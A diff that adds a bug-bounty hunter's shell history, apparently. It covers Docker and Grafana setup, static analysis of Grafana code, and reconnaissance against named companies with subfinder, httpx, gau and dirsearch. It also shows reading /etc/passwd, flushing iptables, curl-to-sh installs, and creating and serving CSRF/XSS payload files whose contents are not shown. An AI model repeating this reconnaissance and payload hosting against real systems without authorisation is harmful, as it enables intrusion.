@@ -1,0 +1,2000 @@
+#1744541584
+docker
+#1744541601
+sudo apt install docker docker-compose
+#1744541614
+sudo apt install docker.io
+#1744541643
+docker compose
+#1744541648
+docker-compose
+#1744541657
+sudo apt install docker-compose
+#1744541667
+id
+#1744541674
+cat /etc/passwd
+#1744541678
+ip a
+#1744541722
+docker
+#1744541738
+sudo docker run -d --name=grafana -p 3000:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1744541764
+docker
+#1744541765
+ip a
+#1744541771
+docker images ls
+#1744541775
+sudo docker images ls
+#1744541780
+sudo docker image ls
+#1744544556
+sudo docker image -h
+#1744544570
+sudo docker -h
+#1744544581
+sudo docker container ls
+#1744544591
+sudo docker container stop
+#1744544601
+sudo docker container stop 244a3b6d3571
+#1744544604
+sudo docker container ls
+#1744544608
+sudo docker image ls
+#1744544665
+sudo docker container rm 244a3b6d3
+#1744544682
+sudo docker images rm 8aaa25430c9f
+#1744544688
+sudo docker images
+#1744544694
+sudo docker images 
+#1744544706
+sudo docker container ls
+#1744544710
+sudo docker -h
+#1744544767
+sudo docker run -d --name=grafana -p 3000:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1744544772
+sudo docker container ls
+#1744545341
+sudo docker container stop 3a3fb408dbda
+#1744545346
+sudo docker container rm 3a3fb408dbda
+#1744545462
+sudo docker run -d --name=grafana -p 3000:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1744546088
+sudo docker container ls
+#1744546099
+sudo docker container stop 54e5233e2908
+#1744546109
+sudo docker container rm 54e5233e2908
+#1744546112
+sudo docker run -d --name=grafana -p 3000:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1744548229
+sudo docker container ls
+#1744548238
+sudo docker container stop cfafc8e4b3cc
+#1744548243
+sudo docker container rm cfafc8e4b3cc
+#1744548246
+sudo docker run -d --name=grafana -p 3000:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1744549498
+sudo docker container ls
+#1744549506
+sudo docker container stop dd5ad047d94d
+#1744549511
+sudo docker container rm dd5ad047d94d
+#1744549564
+sudo docker run -d --name=grafana -p 3000:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1744549854
+sudo docker container ls
+#1744549862
+sudo docker container stop 24c1bd3b6b53
+#1744549866
+sudo docker container rm 24c1bd3b6b53
+#1744549868
+sudo docker run -d --name=grafana -p 3000:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1744551319
+sudo docker container ls
+#1744551337
+sudo docker container rm 24c1bd3b6b53
+#1744551342
+sudo docker container rm 2119cab4f6ee
+#1744551346
+sudo docker container stop 2119cab4f6ee
+#1744551348
+sudo docker container rm 2119cab4f6ee
+#1744551351
+sudo docker run -d --name=grafana -p 3000:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1744552412
+sudo docker container ls
+#1744552422
+sudo docker container stop 4bf7fc0384fa
+#1744552426
+sudo docker container rm 4bf7fc0384fa
+#1744552429
+sudo docker run -d --name=grafana -p 3000:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1744554502
+sudo docker container ls
+#1744554511
+sudo docker container stop ac01d91e216c
+#1744554515
+sudo docker container rm ac01d91e216c
+#1744554525
+sudo docker image ls
+#1744554531
+sudo docker run -d --name=grafana -p 3000:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1744554535
+exit
+#1744601875
+cd
+#1744601889
+cd BugBounty/
+#1744601894
+cd recon/
+#1744601897
+ls
+#1744601903
+cd
+#1744601912
+cd -
+#1744601922
+ls *
+#1744601934
+ls -la *
+#1744602063
+cd ../../tools/
+#1744602065
+ls
+#1744602081
+./pspy64s
+#1744602228
+kill -9 110734
+#1744602293
+./pspy64s
+#1744602401
+kill -9 116681
+#1744602408
+kill -9 116680
+#1744602414
+kill -9 116682
+#1744602422
+kill -9 116683
+#1744602430
+./pspy64s
+#1744602543
+cd /opt/automation_scripts/
+#1744602548
+ls
+#1744602609
+crontab -e
+#1744602681
+crontab -l
+#1744602722
+bat /etc/crontab
+#1744602767
+cd /home/lab/ 
+#1744602773
+cd tools 
+#1744602776
+ls
+#1744602881
+cd ../BugBounty/recon/
+#1744602892
+ls -la *
+#1744602921
+tail int-oda/nohup.out 
+#1744602963
+echo xB3f1uYs5DmqkT/a7VxdOw== |base64 -d 
+#1744602989
+cat int-redbull/livewebservers.txt 
+#1744603010
+cat int-redbull/openports.txt 
+#1744603060
+ls -la *
+#1744603093
+exit
+#1745003483
+cd
+#1745003485
+ls
+#1745003510
+ls backups/
+#1745003517
+ls -la 
+#1745003548
+cd BugBounty/
+#1745003549
+ls
+#1745003616
+mkdir codebase
+#1745003620
+cd codebase/
+#1745003645
+mkdir grafana-oss
+#1745003656
+mkdir grafana-loki
+#1745003681
+cd grafana-oss/
+#1745004148
+cd
+#1745004155
+cd BugBounty/
+#1745004486
+cd 
+#1745004512
+cd BugBounty/codebase/grafana-oss/
+#1745004521
+git clone https://github.com/grafana/grafana.git
+#1745004797
+ls -la 
+#1745004802
+cd ..
+#1745004807
+cd grafana-loki/
+#1745004978
+git clone https://github.com/grafana/loki.git
+#1745005570
+cd ../grafana-oss/
+#1745005582
+cd ..
+#1745005624
+cat /etc/hostname 
+#1745005630
+uname
+#1745005643
+uname -a
+#1745005682
+curl -sfL https://raw.githubusercontent.com/securego/gosec/master/install.sh | sh -s -- -b $(go env GOPATH)/bin vX.Y.Z
+#1745005743
+curl -sfL https://raw.githubusercontent.com/securego/gosec/master/install.sh | sh -s -- -b $(go env GOPATH)/bin v2.22.3
+#1745005803
+gosec -h
+#1745006034
+nohup gosec -fmt=json -out=results.json ./...
+#1745006117
+ls
+#1745006124
+cat nohup.out 
+#1745006155
+ls
+#1745006286
+ls -la 
+#1745006294
+tail nohup.out 
+#1745006364
+ls
+#1745006381
+cat nohup.out 
+#1745006572
+go get github.com/stripe/safesql
+#1745006610
+go install github.com/stripe/safesql
+#1745006629
+go install github.com/stripe/safesql@latest
+#1745006659
+safesqln-h
+#1745006667
+safesql -h
+#1745006694
+safesql grafana-oss/grafana/
+#1745006750
+cd grafana-oss/grafana/
+#1745006753
+ls -la 
+#1745006785
+cd pkg/
+#1745006787
+ls -la 
+#1745006805
+cd api
+#1745006808
+ls
+#1745006821
+cd ..
+#1745006831
+safesql api
+#1745007616
+grep -R "template" *
+#1745007643
+grep -R "html/template" *
+#1745007670
+cd web/
+#1745007672
+ls
+#1745007728
+head render.go 
+#1745007742
+nano render.go 
+#1745007874
+cd
+#1745007890
+cd BugBounty/codebase/
+#1745007893
+ls -la 
+#1745007918
+cd ../../tools/
+#1745007925
+./pspy64s
+#1745008023
+cd -
+#1745008047
+rm nohup.out 
+#1745008049
+ls
+#1745008095
+nohup gosec -fmt=json -out=results.json ./... &
+#1745008111
+ls -la 
+#1745008271
+tail nohup.out 
+#1745008340
+ls
+#1745008345
+ls -la
+#1745008732
+sudo apt install Golangci-lint
+#1745008752
+curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/HEAD/install.sh | sh -s -- -b $(go env GOPATH)/bin v2.1.2
+#1745008781
+golangci-lint --version
+#1745036272
+cd
+#1745036283
+cd BugBounty/codebase/
+#1745036286
+ls -la 
+#1745036309
+head results.json 
+#1745036329
+nano results.json 
+#1745036588
+golangci-lint -h
+#1745036956
+grep -R "exec.Command(" *
+#1745037079
+cd /opt
+#1745037082
+ls -la 
+#1745037100
+cd -
+#1745037112
+docker container ls
+#1745037127
+sudo docker container ls
+#1745037140
+sudo docker container -h
+#1745037212
+sudo docker container exec -it /bin/bash
+#1745037253
+sudo docker exec -it /bin/bash a47681a4a5a9
+#1745037283
+sudo docker exec -it a47681a4a5a9 /bin/bash 
+#1745037621
+sudo docker exec -it a47681a4a5a9 /bin/bash -u root
+#1745037641
+sudo docker exec -u root -it a47681a4a5a9 /bin/bash
+#1745037702
+sudo docker exec -it a47681a4a5a9 /bin/bash 
+#1745037934
+nano .golangci.yml
+#1745038004
+cat .golangci.yml 
+#1745038130
+golangci-lint --default all run ./...
+#1745038152
+rm .golangci.yml 
+#1745038154
+golangci-lint --default all run ./...
+#1745038184
+cd grafana-oss/
+#1745038205
+nohup golangci-lint --default all run ./... &
+#1745038221
+cat nohup.out 
+#1745038238
+cd grafana/
+#1745038247
+nohup golangci-lint --default all run ./... &
+#1745038258
+cat nohup.out 
+#1745038287
+cd ../../grafana-loki/loki/
+#1745038293
+nohup golangci-lint --default all run ./... &
+#1745038303
+cat nohup.out 
+#1745038339
+cd ../../grafana-oss/grafana/
+#1745038343
+cat nohup.out 
+#1745038355
+exit
+#1745046422
+cd
+#1745046429
+cd BugBounty/
+#1745046432
+cd codebase/
+#1745046434
+ls -la 
+#1745046442
+cd grafana-oss/grafana/
+#1745046446
+cst
+#1745046455
+cat nohup.out 
+#1745046472
+ol
+#1745046475
+ls -la 
+#1745095039
+sudo docker exec -u root -it a47681a4a5a9 /bin/bash
+#1745095331
+exit
+#1745737621
+cd BugBounty/
+#1745737623
+ls -la
+#1745737662
+cd recon
+#1745738865
+ls -la
+#1745738895
+mkdir .ignoredirs
+#1745738902
+mv int-redbull/ .ignoredirs/
+#1745738916
+mv h1-inspectorio/ .ignoredirs/
+#1745739352
+katana 
+#1745739362
+ls /opt
+#1745739369
+ls ../../tools/
+#1745739380
+nuclei 
+#1745739433
+cd ../../nuclei-templates/
+#1745739435
+ls -la
+#1745739469
+git fetch
+#1745739476
+cd ..
+#1745739480
+git clone https://github.com/projectdiscovery/nuclei-templates
+#1745739488
+rm -rf nuclei-templates/
+#1745739490
+git clone https://github.com/projectdiscovery/nuclei-templates
+#1745739549
+nuclei 
+#1745739576
+nuclei -validate
+#1745739614
+ruby
+#1745739621
+sudo apt install ruby
+#1745739636
+nuclei -validate
+#1745739674
+nuclei -h
+#1745739692
+nuclei -up -ut
+#1745739698
+nuclei-ut
+#1745739700
+nuclei -ut
+#1745739781
+cd /opt/
+#1745739783
+cd automation_scripts/
+#1745739784
+ls -la
+#1745739802
+cat recon.sh 
+#1745739815
+cd subscripts/
+#1745739817
+ls -la
+#1745742913
+exit
+#1745743095
+cd BugBounty/recon/
+#1745743096
+ls -la
+#1745743180
+mkdir int-digitalocean
+#1745743188
+cd int-digitalocean/
+#1745743197
+touch roots.txt
+#1745743201
+touch domains.txt
+#1745743207
+touch _ips.txt
+#1745743213
+mv roots.txt _roots.txt
+#1745743222
+mv domains.txt _domains.txt
+#1745743696
+nano _roots.txt
+#1745743710
+nano _domains.txt 
+#1745743730
+cd ..
+#1745743740
+mkdir int-lendogroup
+#1745743744
+cd int-lendogroup/
+#1745743759
+touch _roots.txt _domains.txt _ips.txt
+#1745743764
+nano _domains.txt 
+#1745743769
+cd ..
+#1745743776
+mkdir int-rivian
+#1745743780
+cd int-rivian/
+#1745743784
+touch _roots.txt _domains.txt _ips.txt
+#1745743789
+nano _roots.txt 
+#1745743806
+nano _domains.txt 
+#1745743818
+nano outofscope.txt
+#1745743834
+cd ..
+#1745743842
+mkdir int-manypets
+#1745743845
+cd int-manypets/
+#1745743848
+touch _roots.txt _domains.txt _ips.txt
+#1745743851
+nano _roots.txt 
+#1745743868
+nano _domains.txt 
+#1745743884
+cd ..
+#1745743885
+ls -la
+#1745743903
+ls -la *
+#1745743928
+ls -la
+#1745743943
+mv h1-grafanalabs/ int-grafanalabs/
+#1745743954
+mv int-grafanalabs/ .ignoredirs/
+#1745743961
+mv h1-matomo/ .ignoredirs/
+#1745743962
+ls -la
+#1745744009
+exit
+#1745779780
+sudo apt-get install -y apt-transport-https
+#1745779790
+sudo apt-get install -y software-properties-common wget
+#1745779837
+sudo wget -q -O /usr/share/keyrings/grafana.key https://apt.grafana.com/gpg.key
+#1745781834
+echo "deb [signed-by=/usr/share/keyrings/grafana.key] https://apt.grafana.com stable main" | sudo tee -a /etc/apt/sources.list.d/grafana.list
+#1745781841
+sudo apt update
+#1745781876
+docker ps
+#1745781881
+sudo docker ps
+#1745781970
+sudo docker run -d --name=grafana -p 3000:3001 grafana/grafana-enterprise:11.6.0-ubuntu
+#1745781990
+sudo docker ls
+#1745782024
+sudo docker container stop a47681a4a5a9
+#1745782030
+sudo docker container rm a47681a4a5a9
+#1745782035
+sudo docker run -d --name=grafana -p 3000:3001 grafana/grafana-enterprise:11.6.0-ubuntu
+#1745782062
+docker ls
+#1745782066
+sudo docker ls
+#1745782072
+sudo docker container ls
+#1745782098
+sudo apt-get install grafana
+#1745782155
+ls
+#1745782226
+sudo docker container ls
+#1745782244
+sudo docker run -h
+#1745782248
+sudo docker run --help
+#1745782397
+curl -I 127.0.0.1:3001 
+#1745782406
+curl -I 127.0.0.1:3000 
+#1745782413
+curl -I https://127.0.0.1:3000 
+#1745782416
+curl -I https://127.0.0.1:3000 -k
+#1745782420
+curl -I https://127.0.0.1:3001 -k
+#1745782459
+sudo docker exec -u root -it e3dcaad04b54 /bin/bash
+#1745782557
+sudo docker container ls
+#1745782564
+sudo docker container stop e3dcaad04b54
+#1745782568
+sudo docker container rm e3dcaad04b54
+#1745782582
+sudo docker run -d --name=grafana -p 3001:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1745782588
+sudo docker container ls
+#1745782789
+clear
+#1745785967
+sudo /bin/systemctl status grafana-server
+#1745785981
+sudo /bin/systemctl start grafana-server
+#1745785983
+sudo /bin/systemctl status grafana-server
+#1745786018
+curl localhost:3000 -I
+#1745786106
+sudo /bin/systemctl enable grafana-server
+#1745786364
+sudo /bin/systemctl status grafana-server
+#1745786418
+cat /etc/grafana/grafana.ini
+#1745786422
+sudo cat /etc/grafana/grafana.ini
+#1745786438
+sudo cat /etc/grafana/grafana.ini | grep 3000
+#1745786547
+sudo cat /etc/grafana/grafana.ini | grep port
+#1745786565
+sudo /bin/systemctl status grafana-server
+#1745786574
+sudo /bin/systemctl restart grafana-server
+#1745786578
+sudo systemctl restart grafana-server
+#1745786588
+sudo systemctl status grafana-server
+#1745786695
+sudo cat /etc/grafana/grafana.ini | grep host
+#1745786708
+cat /etc/hosts
+#1745786730
+netstat -tulnp | grep 3000
+#1745786752
+netstat -tulnp | grep 3001
+#1745786809
+iptables -F
+#1745786814
+sudo iptables -F
+#1745787052
+curl localhost:3000
+#1745787057
+curl localhost:3001
+#1745787073
+sudo docker container ls
+#1745787104
+sudo docker run -d --name=grafana -p 3001:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1745787115
+sudo docker container ls
+#1745787118
+sudo docker containers ls
+#1745787121
+sudo docker container ls
+#1745787170
+sudo docker images
+#1745787196
+sudo docker run -d --name=grafana -p 3001:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1745787210
+sudo docker container rm b3a1d63846aeae2f24b4c43213a366518de50f5b44004a1de9ade4d1a7ab97cb
+#1745787212
+sudo docker run -d --name=grafana -p 3001:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1745787230
+sudo systemctl status grafana-server.service 
+#1745787248
+netstat -tulnp | grep 3000
+#1745787258
+netstat | grep 3000
+#1745787267
+ps aux
+#1745787272
+ps aux | grep 3000
+#1745787303
+netstat -tulnp | grep 3000
+#1745787320
+sudo cat /etc/grafana/grafana.ini | grep host
+#1745787337
+cat /etc/hosts
+#1745787399
+sudo nano /etc/grafana/grafana.ini
+#1745787461
+sudo systemctl status grafana-server.service 
+#1745787468
+sudo systemctl restart grafana-server.service 
+#1745787496
+curl localhost:3000
+#1745787504
+sudo systemctl stop grafana-server.service 
+#1745787508
+sudo systemctl stop grafana-server
+#1745787514
+sudo systemctl status grafana-server
+#1745787528
+curl localhost:3000
+#1745787541
+sudo systemctl start grafana-server
+#1745787553
+sudo systemctl status grafana-server
+#1745787764
+sudo nano /etc/grafana/grafana.ini
+#1745787787
+sudo systemctl restart grafana-server
+#1745787885
+sudo nano /etc/grafana/grafana.ini
+#1745787901
+sudo systemctl restart grafana-server
+#1745787904
+sudo systemctl status grafana-server
+#1745787932
+sudo systemctl daemon-reload
+#1745787945
+sudo systemctl status grafana-server
+#1745788021
+sudo service grafana-server restart
+#1745788097
+sudo systemctl stop grafana-server
+#1745788102
+sudo service grafana-server stop
+#1745788108
+sudo apt-get remove grafana
+#1745788118
+sudo apt-get remove --auto-remove grafana
+#1745788152
+sudo apt-get install grafana-enterprise
+#1745788205
+sudo systemctl daemon-reload
+#1745788222
+grafana-server 
+#1745788232
+grafana-server  -h
+#1745788257
+sudo systemctl status grafana-server
+#1745788272
+sudo nano /etc/grafana/grafana.ini
+#1745788336
+sudo systemctl status grafana-server
+#1745788341
+sudo systemctl start grafana-server
+#1745788347
+sudo systemctl enable grafana-server
+#1745788375
+sudo systemctl status grafana-server
+#1745788427
+sudo systemctl edit grafana-server.service
+#1745788567
+sudo systemctl restart grafana-server
+#1745788584
+sudo systemctl status grafana-server
+#1745788600
+sudo nano /etc/grafana/grafana.ini
+#1745788619
+sudo systemctl restart grafana-server
+#1745788647
+curl localhost:3000
+#1745788649
+curl localhost:30000
+#1745788659
+curl lab.hacdex.com:30000
+#1745788951
+sudo systemctl stop grafana-server
+#1745788958
+sudo systemctl disable grafana-server
+#1745788992
+sudo service grafana-server stop
+#1745789002
+clear
+#1745789412
+sudo docker run -d --name=grafana0 -p 3002:3000 grafana/grafana-enterprise:11.6.0-ubuntu
+#1745789557
+sudo usermod -aG docker lab
+#1745789559
+id
+#1745789568
+exit
+#1745789571
+id
+#1745789579
+docker ps
+#1745789632
+cd /opt
+#1745789635
+ls -la
+#1745789641
+cd
+#1745789643
+ls -la
+#1745789645
+ls
+#1745789668
+mkdir grafana_configs
+#1745789670
+cd grafana_configs/
+#1745789687
+wget https://raw.githubusercontent.com/grafana/loki/v2.8.0/cmd/loki/loki-local-config.yaml -O loki-config.yaml
+#1745789695
+wget https://raw.githubusercontent.com/grafana/loki/v2.8.0/clients/cmd/promtail/promtail-docker-config.yaml -O promtail-config.yaml
+#1745789702
+ls
+#1745789705
+nano loki-config.yaml 
+#1745789834
+rm loki-config.yaml 
+#1745789836
+rm promtail-config.yaml 
+#1745789838
+ls
+#1745789846
+wget https://raw.githubusercontent.com/grafana/loki/v3.4.1/cmd/loki/loki-local-config.yaml -O loki-config.yaml
+#1745789854
+wget https://raw.githubusercontent.com/grafana/loki/v3.4.1/clients/cmd/promtail/promtail-docker-config.yaml -O promtail-config.yaml
+#1745789891
+docker run --name loki -d -v $(pwd):/mnt/config -p 3100:3100 grafana/loki:3.4.1 -config.file=/mnt/config/loki-config.yaml
+#1745789908
+docker run --name promtail -d -v $(pwd):/mnt/config -v /var/log:/var/log --link loki grafana/promtail:3.4.1 -config.file=/mnt/config/promtail-config.yaml
+#1745789940
+docker container ls
+#1745789958
+docker run --name loki -d -v $(pwd):/mnt/config -p 3100:3100 grafana/loki:3.4.1 -config.file=/mnt/config/loki-config.yaml
+#1745789980
+docker container stop c020d9f3d7b11992df1e153fc0a0ca46d698edfd99853e80644a4a49bf5c0c5c
+#1745789985
+docker container rm c020d9f3d7b11992df1e153fc0a0ca46d698edfd99853e80644a4a49bf5c0c5c
+#1745789995
+docker run --name loki -d -v $(pwd):/mnt/config -p 3100:3100 grafana/loki:3.4.1 -config.file=/mnt/config/loki-config.yaml
+#1745790000
+docker container ls
+#1745790018
+sudo docker container ls
+#1745790038
+docker run --name loki -d -v $(pwd):/mnt/config -p 3100:3100 grafana/loki:3.4.1 -config.file=/mnt/config/loki-config.yaml
+#1745790056
+docker ps
+#1745790101
+sudo docker container ls
+#1745790152
+docker run --name loki -d -v $(pwd):/mnt/config -p 3100:3100 grafana/loki:3.4.1 -config.file=/mnt/config/loki-config.yaml
+#1745790179
+docker container stop b910bdb97615bee424042842f01a5605e93e36772b32aab70eca86161e563aee
+#1745790183
+docker container rm b910bdb97615bee424042842f01a5605e93e36772b32aab70eca86161e563aee
+#1745790236
+sudo docker container ls
+#1745790255
+docker run --name loki -d -v $(pwd):/mnt/config -p 3100:3100 grafana/loki:3.4.1 -config.file=/mnt/config/loki-config.yaml
+#1745790260
+sudo docker container ls
+#1745790275
+docker container ls
+#1745790308
+docker ps
+#1745790311
+docker ps -a
+#1745790346
+docker logs 098dd32d11ab
+#1745790351
+ls -la
+#1745790374
+sudo docker container stop 098dd32d11ab
+#1745790377
+sudo docker container rm 098dd32d11ab
+#1745790394
+sudo docker container stop e12a2dcb1798
+#1745790397
+sudo docker container rm e12a2dcb1798
+#1745790401
+docker ps -a
+#1745790465
+docker run --name loki -d -v $(pwd):"/mnt/config" -p 3100:3100 grafana/loki:3.4.1 -config.file="/mnt/config/loki-config.yaml"
+#1745790467
+docker ps -a
+#1745790497
+sudo docker exec -u root -it ad09bfad22ec /bin/bash
+#1745790529
+docker run --name loki -d -v $(pwd):"/opt/config" -p 3100:3100 grafana/loki:3.4.1 -config.file="/opt/config/loki-config.yaml"
+#1745790551
+sudo docker container rm ad09bfad22ec49b67958fc98e08c860a603c0c68164563a457a95b3b38fa3596
+#1745790561
+docker run --name loki0 -d -v $(pwd):"/opt/config" -p 3100:3100 grafana/loki:3.4.1 -config.file="/opt/config/loki-config.yaml"
+#1745790565
+docker ps -a
+#1745790579
+docker logs 8b0890940057
+#1745790653
+cat loki-config.yaml 
+#1745790730
+docker run --name loki0 -d -v $(pwd):"/opt/config" -p 3100:3100 grafana/loki:3.4.1 -config.file="/opt/config/loki-config.yaml"
+#1745790741
+docker container rm 8b08909400572d066e6ce3db2eca147da933b3ed03da305eebfb7e4e9336f847
+#1745790782
+docker run --name loki0 -d -v $(pwd):"/opt/config" -p 3100:3100 grafana/loki:3.4.1 --config.file="/opt/config/loki-config.yaml"
+#1745790786
+docker ps -a
+#1745790813
+docker run --name loki0 -d -v $(pwd):"/opt/config" -p 3100:3100 grafana/loki:3.4.1 --config.file="/opt/config/loki-config.yaml"
+#1745790825
+docker container rm 624f93ea1e893af2e8827406266e145fcc1968022a9280ec5f62ddc67d360bda
+#1745790863
+docker run --name loki0 -d -v $(pwd):/opt/config -p 3100:3100 grafana/loki:3.4.1 -config.file=/opt/config/loki-config.yaml
+#1745790866
+docker ps -a
+#1745790912
+docker container rm a4e1000a90ee
+#1745790920
+mkdir loki
+#1745790922
+cd loki/
+#1745790923
+wget https://raw.githubusercontent.com/grafana/loki/v3.4.1/production/docker-compose.yaml -O docker-compose.yaml
+#1745790927
+nano docker-compose.yaml 
+#1745790989
+docker-compose -f docker-compose.yaml up
+#1745791590
+docker-compose -f docker-compose.yaml up --detach --no-recreate
+#1745791781
+docker ls
+#1745791784
+docker ps
+#1745791806
+docker ps --help
+#1745791861
+sudo docker exec -u root -it 8d99f171d961 /bin/bash
+#1745792265
+docker ps
+#1745792276
+docker container restart 8d99f171d961
+#1745792658
+cat docker-compose.yaml 
+#1745792675
+nano docker-compose.yaml 
+#1745792714
+docker-compose -f docker-compose.yaml 
+#1745792724
+docker-compose -f docker-compose.yaml restart
+#1745792754
+docker-compose -f docker-compose.yaml kill
+#1745792762
+docker-compose -f docker-compose.yaml ps
+#1745792768
+docker ps
+#1745792771
+docker ps -a
+#1745792784
+docker containers rm e91e0c25688c
+#1745792788
+docker container rm e91e0c25688c
+#1745792799
+docker container rm 1c5874b6da10
+#1745792807
+docker container rm 8d99f171d961
+#1745792836
+docker-compose -f docker-compose.yaml up --detach --no-recreate
+#1745792949
+cd
+#1745792951
+ls -la
+#1745792954
+cd BugBounty/
+#1745792955
+ls
+#1745792958
+cd recon/
+#1745792959
+ls -la
+#1745793047
+docker ps
+#1745793079
+docker container stop 66dc76a57e55
+#1745793084
+docker container rm 66dc76a57e55
+#1745793090
+docker ps
+#1745793974
+exit
+#1745873227
+cd BugBounty/
+#1745873229
+cd recon/
+#1745873230
+pwd
+#1745874235
+cd /opt/
+#1745874236
+ls -la
+#1745874240
+cd automation_scripts/
+#1745874241
+ls -la
+#1745874251
+rm -rf *
+#1745874253
+ls -la
+#1745874261
+nano recon.sh
+#1745874286
+nano recon.idea
+#1745874325
+chmod +x recon.sh 
+#1745874333
+nano /etc/crontab
+#1745874525
+sudo nano /etc/crontab
+#1745874541
+crontab -e
+#1745874561
+sudo nano /etc/crontab
+#1745874569
+crontab -e
+#1745874615
+ls -la
+#1745874619
+./recon.sh 
+#1745874630
+sudo apt update parallel
+#1745874639
+sudo apt install parallel
+#1745874673
+go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+#1745874792
+go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
+#1745874856
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+#1745874961
+smap
+#1745874965
+gau
+#1745875018
+go install github.com/g0ldencybersec/gungnir/cmd/gungnir@latest
+#1745875174
+nano recon.
+#1745875178
+nano recon.sh 
+#1745875319
+gau -h
+#1745875502
+nano recon.sh 
+#1745875757
+./recon.sh 
+#1745876122
+crontab -e
+#1745876134
+exit
+#1745934414
+md5sum -h
+#1745934418
+md5sum --help
+#1745934439
+md5sum .bashrc 
+#1745934550
+sudo docker exec -u root -it 8d99f171d961 /bin/bash
+#1745934555
+docker container ls
+#1745934570
+sudo docker exec -u root -it 1316578fbfb3 /bin/bash
+#1745934714
+docker exec -it 1316578fbfb3 /bin/bash
+#1745934729
+docker container ls
+#1745934743
+docker exec -it 71bc4c8d0f0a /bin/bash
+#1745934752
+docker exec -u root -it 71bc4c8d0f0a /bin/bash
+#1745934783
+docker exec -u root -it 1316578fbfb3 /bin/bash
+#1745934813
+docker exec -u root -it 82672cee2597 /bin/bash
+#1745938727
+subfinder -h
+#1745938833
+subfinder -dL rivian.com -all -recursive
+#1745938839
+subfinder -d rivian.com -all -recursive
+#1745938874
+subfinder -d rivian.com -all -recursive > BugBounty/recon/int-rivian/
+#1745938907
+subfinder -d rivian.com -all -recursive > BugBounty/recon/int-rivian/subfinder.out
+#1745938983
+cd BugBounty/recon/int-rivian/
+#1745938987
+ls -la
+#1745938995
+nano subfinder.out 
+#1745939016
+mv subfinder.out subfinder.o
+#1745939032
+cat subfinder.o | sort > subfinder.out
+#1745939036
+rm subfinder.o
+#1745939039
+nano subfinder.out 
+#1745939182
+gungnir -d rivian.com > gungnir.out
+#1745939218
+gungnir rivian.com
+#1745939255
+gungnir rivian.com | grep "rivian"
+#1745939283
+assetfinder
+#1745939296
+go get -u github.com/tomnomnom/assetfinder
+#1745939310
+go install -u github.com/tomnomnom/assetfinder
+#1745939322
+go install -u github.com/tomnomnom/assetfinder@latest
+#1745939328
+go install github.com/tomnomnom/assetfinder@latest
+#1745939344
+assetfinder rivian.com
+#1745939363
+assetfinder rivian.com > assetfinder.out
+#1745939479
+rm gungnir.out 
+#1745939884
+cat subfinder.out 
+#1745939897
+gau o1.supplieroperations.rivian.co
+#1745939941
+cat subfinder.out | gau --subs | sort -u > gau.out
+#1745940115
+head gau.out 
+#1745940118
+rm gau.out 
+#1745940209
+cat subdomain.txt | httpx -ports 80,443,8080,8000,888880,8443,9000,9080 -threads 200 > subdomains_alive.txt
+#1745940218
+cat subfinder.out | httpx -ports 80,443,8080,8000,888880,8443,9000,9080 -threads 200 > subdomains_alive.txt
+#1745940296
+cat subdomains_alive.txt 
+#1745940373
+cat subdomains_alive.txt | gau --subs | sort -u > gau.out
+#1745941905
+nano gau.out 
+#1745942154
+cat gau.out | grep -E 'media\.rivian\.com|demovehicles|asset\.rivian\.com' > gau.filtered
+#1745942160
+nano gau.filtered 
+#1745942410
+dirsearch -u http://landing.rivian.com:8443/ -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+#1745942619
+exit
+#1746504772
+ls -la
+#1746504774
+ls
+#1746504853
+cd htdocs/
+#1746504854
+ls
+#1746504856
+cd lab.hacdex.com/
+#1746504858
+ls -la
+#1746504862
+cd payloads/
+#1746504863
+ls
+#1746504879
+nano csrf-xss.js
+#1746507153
+nano 127.0.0.1.html
+#1746508224
+nano 127.0.0.1-1.html
+#1746508347
+nano 127.0.0.1.html
+#1746508684
+cd ../../
+#1746508687
+cd ..
+#1746508689
+ls -la
+#1746508691
+ls
+#1746508697
+mkdir pyserver
+#1746508719
+cp htdocs/lab.hacdex.com/payloads/127.0.0.1* pyserver/
+#1746508722
+cd pyserver/
+#1746508723
+ls -la
+#1746508745
+python3 -m http.server 11900
+#1746508909
+python3 -m https.server 11900
+#1746508919
+python3 -m http.server 9080
+#1746508928
+ip a
+#1746508949
+python3 -m http.server 9080
+#1746509081
+cat 127.0.0.1-1.html 
+#1746509147
+cat 127.0.0.1.html 
+#1746510991
+ls -la
+#1746510993
+cd ..
+#1746510997
+rm -rf pyserver/
+#1746511004
+cd htdocs/lab.hacdex.com/payloads/
+#1746511005
+ls -la
+#1746511012
+rm -rf 127.0.0.1*
+#1746511014
+ls -la
+#1746511020
+cat csrf-xss.js 
+#1746511038
+nano csrf.html
+#1746511059
+exit
+#1746588983
+cd htdocs/lab.hacdex.com/payloads/
+#1746588986
+ls -la
+#1746588993
+cat csrf.html 
+#1746589523
+nano csrf1.html 
+#1746589843
+rm csrf.html 
+#1746589853
+mv csrf1.html csrf.html
+#1746590709
+ls
+#1746590739
+cp csrf.html 127.0.0.1.html
+#1746590749
+nano 127.0.0.1.html 
+#1746590897
+rm 127.0.0.1.html 
+#1746590899
+nano 127.0.0.1.html 
+#1746590923
+nano csrfpointer.html
+#1746591522
+cat csrfpointer.html 
+#1746596886
+nano csrf-contenttype.html
+#1746597215
+cat csrf-contenttype.html 
+#1746597286
+nano csrf-contenttype.html
+#1746598823
+ls-la
+#1746598827
+ls -la
+#1746598832
